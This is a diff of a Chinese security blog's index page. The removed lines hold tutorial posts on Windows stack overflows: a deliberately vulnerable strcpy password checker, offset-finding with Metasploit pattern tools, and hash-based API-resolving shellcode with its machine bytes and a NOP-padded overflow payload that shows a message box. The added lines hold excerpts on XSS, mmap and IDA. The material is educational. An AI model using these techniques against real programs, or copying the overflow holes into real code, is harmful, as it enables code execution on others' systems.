-    hash = GetHash("AddAtomA");
-    printf("result of hash is %.8x\n", hash);
-}
-</25)|(digest></code></pre>
-
-<p>通过该hash算法获得API函数对应的摘要</p>
-<table>
-<thead>
-<tr>
-<th>API函数</th>
-<th>hash值</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>MessageBoxA</td>
-<td>0x1e380a6a</td>
-</tr>
-<tr>
-<td>ExitProcess</td>
-<td>0x4fd18963</td>
-</tr>
-<tr>
-<td>LoadLibraryA</td>
-<td>0x0c917432</td>
-</tr>
-</tbody>
-</table>
-<p>在将hash压入栈中之前，注意先将增量标志DF清零。因为当shellcode是利用异常处理机制而植入的时候，往往会产生标志位的变化，使shellcode中字符串处理方向发生变化而产生错误(如指令LODSD)。</p>
-<p><img src="/images/2017-06-22/address_api.jpg" alt="定位API的流程图"></p>
-<pre><code>
-void main()
-{
-    __asm{
-        CLD                    ;clear flag DF
-        ;store hash
-        push 0x1e380a6a        ;hash of MessageBoxA
-        push 0x4fd18963        ;hash of ExitProcess
-        push 0x0c917432        ;hash of LoadLibraryA
-        mov esi, esp        ;esi = addr of first function hash
-        lea edi,[esi-0xc]    ;edi = addr of start writing function
-
-        ;make some stack space
-        xor ebx,ebx
-        mov bh, 0x04
-        sub esp, ebx
-
-        ;push a pointer to "user32" onto stack
-        mov bx, 0x3233        ;32
-        push ebx
-        push 0x72657375        ;user
-        push esp
-        xor edx,edx
-
-        ;find base addr of kernel32.dll
-        mov ebx, fs:[edx+0x30]        ;ebx = address of PEB
-        mov ecx, [ebx+0x0c]            ;ecx = pointer to loader data
-        mov ecx, [ecx+0x1c]            ;ecx = first entry in initialization order list
-        mov ecx, [ecx]                ;ecx = second entry in list
-        ;mov ecx, [ecx]                ;ebp = base address of kernelbase.dll in after win7
-                                    ;ebp = base address of kernel32.dll in before winxp
-                                    ;some people may think it is the addr of kernel32.dll
-                                    ;but it was wrong
-        mov ebp, [ecx+0x8]            ;under the test, we know it is the addr of kernel32.dll
-
-    find_lib_functions:
-        //lodsd                        ;load next hash into al and increment esi
-        mov eax, [esi]
-        add esi, 0x4
-        cmp eax, 0x1e380a6a            ;hash of MessageBoxA trigger
-                                    ;LoadLibrary("user32")
-        jne find_functions
-        xchg eax,ebp                ;save current hash
-        call [edi - 0x8]            ;LoadLibraryA
-        xchg eax,ebp                ;restore current hash, and update ebp with base address of user32.dll
-
-    find_functions:
-        pushad                        ;preserve registers
-        mov eax, [ebp + 0x3c]        ;eax = start of PE header
-        mov ecx, [ebp + eax + 0x78]    ;ecx = relative offset of export table
-        add ecx, ebp                ;ecx = absolute addr of export table
-        mov ebx, [ecx + 0x20]        ;ebx = relative offset of names table
-        add ebx, ebp                ;ebx = absolute addr of names table
-        xor edi, edi                ;edi will count through the functions
-
-    next_function_loop:
-        inc edi                        ;increment function counter
-        mov esi, [ebx + edi * 4]    ;esi = relative offset of current function name
-        add esi, ebp                ;esi = absolute addr of current function  name
-        cdq                            ;dl will hold hash(we know eax is small)
-
-    hash_loop:
-        movsx eax, byte ptr[esi]
-        cmp al, ah
-        jz compare_hash
-        ror edx, 7
-        add edx, eax
-        inc esi
-        jmp hash_loop
-
-    compare_hash:
-        cmp edx, [esp + 0x1c]    ;compare to the requested hash(saved on stack from pushad)
-        jnz next_function_loop
-        mov ebx, [ecx + 0x24]    ;ebx = relative offset of ordinals table
-        add ebx, ebp            ;ebx = absolute addr of ordinals table
-        mov di, [ebx + 2*edi]    ;di = ordinal number of matched function
-        mov ebx, [ecx + 0x1c]    ;ebx = relative offset of address table
-        add ebx, ebp            ;ebx = absolute addr of address table
-        add ebp, [ebx + 4*edi]    ;add to ebp(base addr of module) the relative offset of matched function
-        xchg eax, ebp            ;move func addr into eax
-        pop edi                    ;edi is last onto stack in pushad
-        stosd                    ;write function addr to [edi] and increment edi
-        push edi
-        popad                    ;restore registers
-                                ;loop until we reach end of the last hash
-        cmp eax, 0x1e380a6a
-        jne find_lib_functions
-
-    function_call:
-        xor ebx, ebx
-        push ebx                ;cut string
-        push 0x74736577
-        push 0x6C696166            ;push failwest
-        mov eax, esp            ;load address of failwest
-        push ebx
-        push eax
-        push eax
-        push ebx
-        call [edi - 0x4]        ;call MessageBoxA
-        push ebx
-        call [edi - 0x8]        ;call ExitProcess
-        nop
-        nop
-        nop
-        nop
-    }
-}
-</code></pre>
-
-<p>其对应的机器码为：</p>
-<pre><code>
-char shellcode2[] = 
-    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
-    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
-    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
-    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
-    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
-    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
-    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
-    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
-    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
-    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
-    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
-
-void main()
-{
-    __asm
-    {
-        lea eax, shellcode2
-        push eax
-        ret
-    }
-}
-</code></pre>
-          
+          自从xss被发现之后，OWASP上经常会出现它的身影。一开始xss作为一种攻击方式，应用并不算广。但是随着漏洞利用的深入钻研，安全研究者们逐渐发现xss的危害，特别是在用户授权与管理方面。
+国内外各大web安全检测厂商，已经在其产品中加入了xss检查、过滤等功能。
+1、XSS原理JavaScript
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/21/web/xss简介/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1254,7 +782,7 @@ void main()
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/0day/栈溢出原理与实践/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/19/code/Linux内存映射函数mmap函数详解/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -1273,7 +801,7 @@ void main()
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/06/22/0day/栈溢出原理与实践/" itemprop="url">栈溢出原理与实践</a></h2>
+                <a class="post-title-link" href="/2017/09/19/code/Linux内存映射函数mmap函数详解/" itemprop="url">Linux内存映射函数mmap函数详解</a></h2>
         
 
         <div class="post-meta">
@@ -1285,8 +813,8 @@ void main()
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T22:13:43+08:00">
-                2017-06-22
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-19T15:48:19+08:00">
+                2017-09-19
               </time>
             
 
@@ -1308,8 +836,8 @@ void main()
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
+                  <a href="/categories/code/" itemprop="url" rel="index">
+                    <span itemprop="name">code</span>
                   </a>
                 </span>
 
@@ -1347,194 +875,17 @@ void main()
       
         
           
-            <p><b>声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。</b></p>
-<h3 id="1-栈溢出原理"><a href="#1-栈溢出原理" class="headerlink" title="1. 栈溢出原理"></a>1. 栈溢出原理</h3><h4 id="1-1-修改邻接变量的原理"><a href="#1-1-修改邻接变量的原理" class="headerlink" title="1.1 修改邻接变量的原理"></a>1.1 修改邻接变量的原理</h4><p>用实例来反映原理</p>
-<pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-
-#define PASSWORD "1234567"
-
-int verify_password(char *password)
-{
-    int authenticated;
-    char buffer[8];
-    authenticated = strcmp(password, PASSWORD);
-    strcpy(buffer, password);
-    return authenticated;
-}
-
-void main()
-{
-    int valid_flag = 0;
-    char password[1024];
-    while(1)
-    {
-        printf("please input password:        ");
-        scanf("%s", password);
-        valid_flag = verify_password(password);
-        if (valid_flag)
-        {
-            printf("incorrect password!\n\n");
-        }
-        else
-        {
-            printf("Congratulations! You have passed the verification!\n");
-            break;
-        }
-    }
-}
-
-</code></pre>
-
-<p>于是栈帧布局为：<br><img src="/images/2017-06-22/stack_layout.png" alt="栈帧布局"></p>
-<p>因此，当你输入7位正确密码（&quot;1234567&quot;）或者输入8字节其他字符串（比原始字符串要大），都能通过验证。authenticated是int类型，在内存中是DWORD，占4个字节。所以当输入8位后，数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。</p>
-<font color="#f00">win32系统中数据是由低位向高位存储一个4字节的双字（DWORD），但作为数值应用时，却是按照由高位字节向低位字节进行解释。</font>
-
-<p>如果输入的是1234567，那么结果为：<br>34 33 32 31<br>00 37 36 35<br>一定要注意window字节顺序</p>
-<h4 id="1-2-修改函数返回地址"><a href="#1-2-修改函数返回地址" class="headerlink" title="1.2 修改函数返回地址"></a>1.2 修改函数返回地址</h4><p>通过覆盖返回地址，我们可以跳转到我们想到达的位置</p>
-<p><b>问题1：如何修改返回地址，并准确的判定返回地址所在位置？</b></p>
-<font color="#0f0">在函数返回的&quot;retn&quot;指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个地址弹入EIP寄存器中，之后跳转到这个地址去执行。栈顶是OllyDbg右侧ESP标灰的那个</font>
-
-<p>所以常见的解决办法是：<br>（1）输入一个较长的字符串，最好这个字符串有一定规律【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_create.rb来创建一定长度的指令】，然后查看返回地址所指向的位置，看看是刚才所指定的字符串的哪个位置【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 来查看字符串出现的地址】<br>（2）本机实验时，offset位置为16（此处的16指的是起始位置），因此如果想要对该程序的返回地址进行修改的话，就应该是<br>               <font color="#f00">&#39;a&#39;*16+返回地址</font><font color="#0f0">（返回地址得逆序编写）</font></p>
-<p><b>问题2：如何控制程序执行流程？</b></p>
-<p>上面已经讲了如何修改返回地址，所以如果在进入某个子函数之后，有栈溢出，就可以修改相应的返回地址，让其能够跳转至想让其执行代码的位置，这样就能控制流程；</p>
-<p>另外一种十分简单的办法就是直接修改PE文件，修改分支指令，这样也可以控制程序执行流程！</p>
-<h3 id="2-代码植入"><a href="#2-代码植入" class="headerlink" title="2. 代码植入"></a>2. 代码植入</h3><h4 id="2-1-测试代码"><a href="#2-1-测试代码" class="headerlink" title="2.1 测试代码"></a>2.1 测试代码</h4><pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;windows.h&gt;
-
-#define PASSWORD "1234567"
-
-int verify_password(char *password)
-{
-    int authenticated;
-    char buffer[44];        //add local buff to be overflowed
-    authenticated = strcmp(password, PASSWORD);
-    strcpy(buffer, password);    //overflowed here!
-    return authenticated;
-}
-
-void main()
-{
-    int valid_flag = 0;
-    char password[1024];
-    FILE *fp;
-    LoadLibrary("user32.dll");    //prepare for messagebox
-    if (!(fp=fopen("password.txt","rw+")))
-    {
-        exit(0);
-    }
-    //MessageBoxA(0,"123","123",0);
-    fscanf(fp, "%s", password);
-    valid_flag = verify_password(password);
-    if(valid_flag)
-    {
-        printf("incorrect password!\n\n");
-    }
-    else
-    {
-        printf("Congratulations! You have passed the verification!\n\n");
-    }
-    fclose(fp);
-}
-</code></pre>
-
-<font color="#dd0">其中头文件windows.h，是方便程序能够顺利调用LoadLibrary函数去装载user32.dll<br>verify_password函数的局部变量buffer由8个字节增加到44字节，这样做是为了有足够的空间来“承载”我们植入的代码。<br>main函数中增加了LoadLibrary(&quot;user32.dll&quot;)用于初始化装载user32.dll，以便在植入代码中调用MessageBox。<br></font>
-
-<p><b>需要完成的工作：</b></p>
-<ol>
-<li>分析并调试漏洞程序，获得淹没返回地址的偏移</li>
-<li>获得buffer的起始地址，并将其写入password.txt的相应偏移，用来冲刷返回地址</li>
-<li>向password.txt中写入可执行的机器代码，用来调用API弹出一个消息框。</li>
-</ol>
-<font color="#f00">通过调试可以获得buffer数组的起始地址0x0012FAF0，以及password.txt文件中第53~56个字符的ASCII码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址</font>
-
-<p>MSDN对该函数的解释如下：</p>
-<pre><code>
-int WINAPI MessageBox(
-  _In_opt_ HWND    hWnd,        //handle to owner window
-  _In_opt_ LPCTSTR lpText,        //text in message box
-  _In_opt_ LPCTSTR lpCaption,    //messagebox title
-  _In_     UINT    uType        //Messagebox style
-);
-</code></pre>
-
-<ul>
-<li>hWnd[in] 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口</li>
-<li>IpText[in]  字符串指针，所指字符串会在消息框中显示</li>
-<li>IpCaption[in]  字符串指针，所指字符串将成为消息框的标题</li>
-<li>uType[in]  消息框的风格（单按钮、多按钮等），NULL代表默认风格</li>
-</ul>
-<p>熟悉MFC的程序员都知道，系统其实并不存在真正的MessageBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数（ASCII）或者“W”类型函数（UNICODE）调用。因此，本文中用的是MessageBoxA。</p>
-<p><b>用汇编语言调用MessageBoxA需要三个步骤</b></p>
-<ol>
-<li>装载动态链接库user32.dll。MessageBoxA是动态链接库user32.dll的导出函数。虽然大多数有图形界面的程序都已经装载了该库，但是本实验的Console程序并没有默认加载。</li>
-<li>在汇编语言中调用该函数需要获得这个函数的入口地址</li>
-<li>在调用前需要向栈中从右向左的顺序压入MessageBoxA的4个参数</li>
-</ol>
-<font color="#f00">获取MessageBoxA的方式，我们在《查找动态链接库的API地址》那一篇博文中有讲，这里仅仅给出Windows 2000 Server的MessageBoxA地址为0x77E16544.</font>
-
-<p>下面将让弹出的窗口显示标题和文本内容都为“failwest”，而压入的第一个和第四个参数都为NULL。</p>
-<p><b><center>机器代码(具体操作可以参见《机器代码与汇编代码的转换》)</center></b></p>
-<table>
-<thead>
-<tr>
-<th>机器代码（十六进制）</th>
-<th>汇编指令</th>
-<th>注释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>33DB</td>
-<td>XOR EBX, EBX</td>
-</tr>
-<tr>
-<td>53</td>
-<td>PUSH EBX</td>
-</tr>
-<tr>
-<td>6877657374</td>
-<td>PUSH 74736577</td>
-</tr>
-<tr>
-<td>6877657374</td>
-<td>PUSH 74736577</td>
-<td>压入NULL结尾的&quot;failwest&quot;字符串。之所以使用EBX清零后作为字符串的截断符，是为了避免&quot;PUSH 0&quot;中的NULL，否则植入的机器码会被strcpy函数截断</td>
-</tr>
-<tr>
-<td>8BC4</td>
-<td>MOV EAX, ESP</td>
-<td>EAX里是字符串指针</td>
-</tr>
-<tr>
-<td>53</td>
-<td>PUSH EBX</td>
-</tr>
-<tr>
-<td>50</td>
-<td>PUSH EAX</td>
-</tr>
-<tr>
-<td>50</td>
-<td>PUSH EAX</td>
-</tr>
-<tr>
-<td>53</td>
-<td>PUSH EBX</td>
-<td>4个参数按照从右向左的顺序入栈，分别是(0,failwest,failwest,0)<br></td>
-</tr>
-</tbody>
-</table>
-<p>消息框是默认风格，文本区和标题都是&quot;failwest&quot;|<br>|B84465E177|MOV EAX, 0x77E16544|<br>|FFD0|CALL EAX|调用函数MessageBoxA。这里的地址依据机器而定|</p>
-<p>然后在这些代码与53—56处的buffer中0x0012FAF0(返回地址)，其余的字节用0x90(nop指令)填充。</p>
-<p>shellcode[] = &quot;\x33\xdb\x53\x68\x77\x65\x73\x74\x68\x77\x65\x73\x74<br>\x8b\xc4\x53\x50\x50\x53\xb8\x44\x65\xe1\x77\xff\xd0\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf0\xfa\x12\x00&quot;</p>
-<p><img src="/images/2017-06-22/failwest_test.jpg" alt="测试结果"></p>
-
-          
+          mmap将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。mmap在用户空间映射调用系统中作用很大。
+函数原型
+void mmap(void start,size_t length,int prot,int flags,in
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/19/code/Linux内存映射函数mmap函数详解/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1581,7 +932,7 @@ int WINAPI MessageBox(
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/0day/栈的介绍/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/tools/IDA的调试脚本idc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -1600,7 +951,7 @@ int WINAPI MessageBox(
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/06/22/0day/栈的介绍/" itemprop="url">栈的介绍</a></h2>
+                <a class="post-title-link" href="/2017/09/18/tools/IDA的调试脚本idc/" itemprop="url">IDA的调试脚本idc</a></h2>
         
 
         <div class="post-meta">
@@ -1612,277 +963,8 @@ int WINAPI MessageBox(
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T21:18:22+08:00">
-                2017-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1、内存的不同用途"><a href="#1、内存的不同用途" class="headerlink" title="1、内存的不同用途"></a>1、内存的不同用途</h3><p>进程使用的内存按照功能分为以下4个部分：<br>（1）代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取出指令并执行。<br>（2）数据区：用于存储全局变量<br>（3）堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。<br>（4）栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</p>
-<p> 协作过程如图所示：<br><img src="/images/2017-06-22/stack_cooperate.png" alt="协作过程图"></p>
-<p>内存中的栈区其实就是系统栈。系统栈由系统来维护。</p>
-<h3 id="2、函数调用过程"><a href="#2、函数调用过程" class="headerlink" title="2、函数调用过程"></a>2、函数调用过程</h3><pre><code>int func_B(int arg_B1, int arg_B2)
-{
-     int var_B1, var_B2;
-     var_B1 = arg_B1 + arg_B2;
-     var_B2 = arg_B1 - arg_B2;
-     return var_B1 * var_B2;
-}
-
-int func_A(int arg_A1, int arg_A2)
-{
-     int var_A;
-     var_A = func_B(arg_A1, arg_A2) + arg_A1;
-     return var_A;
-}
-
-int main(int argc, char **argv, char **envp)
-{
-     int var_main;
-     var_main = func_A(4,3);
-     return var_main;
-}
-</code></pre><p>同一文件的不同函数的代码在内存代码区中的分布可能是相邻也可能相距很远。代码的调用也如下图所示。<br><img src="/images/2017-06-22/code_addr.jpg" alt="代码指令所在位置和CPU在代码区中的取指轨迹"></p>
-<p>代码区精确的跳转是在与系统栈巧妙地配合过程中完成的。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。<br><img src="/images/2017-06-22/stack_call.jpg" alt="系统栈在函数调用中的变化"></p>
-<p>调用时的步骤：<br>（1）母函数调用子函数时，首先现在母函数所在栈帧里压入函数返回地址（一般为调用函数下面一条指令），然后为子函数创建新栈帧并压入系统栈（一般的步骤为push ebp[保存旧栈帧底部]  -&gt;  mov ebp, esp[将现在的栈顶换做栈帧底部]  -&gt; sub esp, xxx[抬高栈顶，为新栈帧开辟空间]）。<br>（2）子函数返回时，子函数的栈帧被弹出系统栈，母函数栈帧中的返回地址出现在栈顶，此时处理器按照这个返回地址重新跳到母函数代码区中执行。</p>
-<h3 id="3、寄存器与函数栈帧"><a href="#3、寄存器与函数栈帧" class="headerlink" title="3、寄存器与函数栈帧"></a>3、寄存器与函数栈帧</h3><p>（1）ESP：栈指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>（2）EBP：基址指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
-<p>在函数栈帧中，一般包含以下几类重要信息：<br>（1）局部变量：为函数局部变量开辟的内存空间。<br>（2）堆栈状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本栈中被弹出后恢复出上一个栈帧。<br>（3）函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</p>
-<h3 id="4、函数调用约定与相关指令"><a href="#4、函数调用约定与相关指令" class="headerlink" title="4、函数调用约定与相关指令"></a>4、函数调用约定与相关指令</h3><p><b><center>几种调用方式的差异</center></b></p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>C</th>
-<th>SysCall</th>
-<th>StdCall</th>
-<th>BASIC</th>
-<th>FORTRAN</th>
-<th>PASCAL</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>参数入栈顺序</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-</tr>
-<tr>
-<td>恢复栈平衡操作的位置</td>
-<td>母函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-</tr>
-</tbody>
-</table>
-<p><b><center>函数调用的约定</center></b></p>
-<table>
-<thead>
-<tr>
-<th>调用约定的声明</th>
-<th>参数入栈顺序</th>
-<th>恢复栈平衡的位置</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>__cdecl</td>
-<td>右-&gt;左</td>
-<td>母函数</td>
-</tr>
-<tr>
-<td>__fastcall</td>
-<td>右-&gt;左</td>
-<td>子函数</td>
-</tr>
-<tr>
-<td>__stdcall</td>
-<td>右-&gt;左</td>
-<td>子函数</td>
-</tr>
-</tbody>
-</table>
-<font color="#f00">默认情况下，VC会使用__stdcall调用方式</font>
-
-<font color="#f00">C++类成员函数都有一个this指针，在Windows平台中，这个指针一般是用ECX寄存器来传递的；但如果用GCC编译器编译，这个指针会作为最后一个参数压入栈中。</font>
-
-<p><b>参数调用步骤</b>：</p>
-<ol>
-<li>参数入栈：由右向左压入参数</li>
-<li>返回地址入栈：当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行</li>
-<li>代码区跳转：处理器从当前代码区跳转至被调用函数的入口处</li>
-<li>栈帧调整：保存当前栈帧状态值，以备后面恢复栈帧时使用（EBP入栈）；将当前栈帧切换到新栈帧（EBP&lt;-ESP，更新栈帧底部）；给新栈帧分配空间（将ESP减去所需空间的大小，抬高栈顶）</li>
-</ol>
-<pre><code>
-;调用前
-push 参数3    ;假设函数有3个参数，那么参数将由右向左依次入栈
-push 参数2
-push 参数1
-call 函数dizhi ;call指令将同时完成两项工作
-              ; a) 向栈中压入当前指令的下一条指令在内存中的位置，即保存返回地址
-              ; b) 跳转到所用函数的入口地址函数入口处
-push ebp    ;保存旧栈帧的底部
-mov ebp, esp    ;设置新栈帧的底部（栈帧切换）
-sub esp, xxx    ;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）
-</code></pre>
-
-<p><img src="/images/2017-06-22/stack_info.png" alt="函数调用时系统栈中的变化情况"></p>
-<p><b>函数返回时的步骤</b>：</p>
-<ol>
-<li>保存返回值（通常将函数的返回值保存到EAX中）</li>
-<li>弹出当前栈帧，恢复上一个栈帧：在栈帧平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间；将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧；将函数返回地址弹给EIP寄存器</li>
-<li>跳转：按照函数返回地址跳回母函数中继续执行</li>
-</ol>
-<pre><code>
-add esp, xxx    ;降低栈顶，回收当前的栈帧
-pop ebp            ;将上一个栈帧底部恢复到ebp
-retn            ;这条指令有两个功能
-                ;a) 弹出当前栈顶元素，即弹出栈帧中的返回地址。
-                ;b) 让处理器跳转至弹出的返回地址，恢复调用前的代码区
-</code></pre>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/tools/机器代码与汇编代码的转换/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/22/tools/机器代码与汇编代码的转换/" itemprop="url">机器代码与汇编代码的转换</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T14:32:31+08:00">
-                2017-06-22
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T21:30:24+08:00">
+                2017-09-18
               </time>
             
 
@@ -1943,810 +1025,17 @@ retn            ;这条指令有两个功能
       
         
           
-            <p>机器代码与汇编代码之间的转换是写shellcode的一个十分重要的环节，所以这一讲主要讲使用那些工具能够方便的进行这两者之间的转换。</p>
-<p><br></p>
-<h4 id="Asm2MachineCode-x86"><a href="#Asm2MachineCode-x86" class="headerlink" title="Asm2MachineCode(x86)"></a>Asm2MachineCode(x86)</h4><font color="#0f0">这在吾爱破解工具包=&gt;编辑辅助工具</font>
-
-<p>该工具主要用于机器代码与汇编代码之间的转换，但是局限也很明显，这只能用于x86的机器。</p>
-<p><img src="/images/2017-06-22/Asm2MachineCode.jpg" alt="机器代码与汇编代码的转化"></p>
-<font color="#f00">需要说明的是，这个编辑器功能强大，十分适合用户进行shellcode的编写。但实际上shellcode的编写一般速度很慢，所以也不一定非用这个不可！</font>
-
-<p><br></p>
-<h4 id="C32asm"><a href="#C32asm" class="headerlink" title="C32asm"></a>C32asm</h4><font color="#0f0">这在吾爱破解工具包=&gt;反编译工具</font><br>使用其 工具-&gt;汇编代码查询<br><font colot="#f00">就目前而言，该功能只能从汇编代码转化为机器代码，所以局限性很强；而且一次只能转换一条指令。</font>
-
-
-<p><br></p>
-<h4 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h4><p>当导入某一运行的程序之后，可以看到运行程序中每条指令的二进制代码以及对应的汇编代码。</p>
-<p>当然，如果想要查看自己编写的汇编语言对应的机器代码，或者想找到机器代码对应的汇编语言，可以对主程序框中部分代码进行修改得到。</p>
-<font color="#foo">可能是了解的比较少，总觉得这么强大的调试工具应该会有十分实用的机器代码与汇编代码的转换工具，但是现在只是找到了上述所讲的那种笨办法！希望后续能够找到。。。</font>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/tools/关于metasploit的EXITFUNC参数的解释/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
